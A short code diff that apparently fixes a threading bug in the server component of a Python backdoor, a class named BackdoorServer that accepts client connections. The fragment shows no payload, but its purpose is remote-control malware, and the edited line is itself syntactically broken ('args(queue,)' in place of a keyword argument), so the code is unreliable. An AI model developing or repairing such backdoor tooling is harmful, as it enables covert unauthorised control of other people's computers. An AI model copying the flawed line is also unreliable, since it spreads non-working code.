@@ -161,7 +161,7 @@ class BackdoorServer(object):
                 self.listen()
 
             
-            result_send = Thread(target=result_queue, args(queue,))
+            result_send = Thread(target=self.result_queue, args(queue,))
             result_send.setDaemon(True)
             
             print("Client connected: {}".format(self.client))
